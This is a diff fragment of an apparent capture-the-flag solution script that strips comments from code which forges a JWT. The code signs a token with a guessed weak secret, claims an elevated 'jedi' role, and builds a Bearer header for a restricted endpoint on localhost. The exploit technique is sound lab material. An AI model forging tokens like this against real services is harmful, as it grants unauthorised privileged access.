@@ -7,20 +7,19 @@ TARGET_URL = "http://localhost:3000"
 SECRET_KEY = "whatever"
 
 def get_flag():
-    # 1. Construct the malicious payload
+  
     payload = {
         "sub": "hacker",
         "role": "jedi",
-        "midichlorian_level": 20000, # Must be > 15000
+        "midichlorian_level": 20000, 
     }
 
-    # 2. Sign the token using the secret key
+
     print(f"[*] Forging JWT with secret: '{SECRET_KEY}'...")
     token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
     
     print(f"[*] Forged Token: {token}")
 
-    # 3. Send the request to the restricted endpoint
     headers = {
         "Authorization": f"Bearer {token}"
     }
